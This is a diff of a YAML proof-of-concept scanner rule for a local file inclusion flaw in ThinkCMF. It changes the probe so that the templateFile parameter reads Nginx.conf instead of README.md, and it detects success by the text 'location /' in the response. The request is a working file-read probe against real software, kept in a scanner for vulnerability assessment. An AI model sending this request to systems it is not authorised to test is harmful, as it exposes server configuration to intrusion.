@@ -2,9 +2,9 @@ name: poc-yaml-thinkcmf-lfi
 
 rules:
   - method: GET
-    path: "/?a=display&templateFile=README.md"
+    path: "/?a=display&templateFile=Nginx.conf"
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(b"## README")))
+      response.status == 200 && response.body.bcontains(bytes(string(b"location /")))
 
 detail:
   author: JerryKing
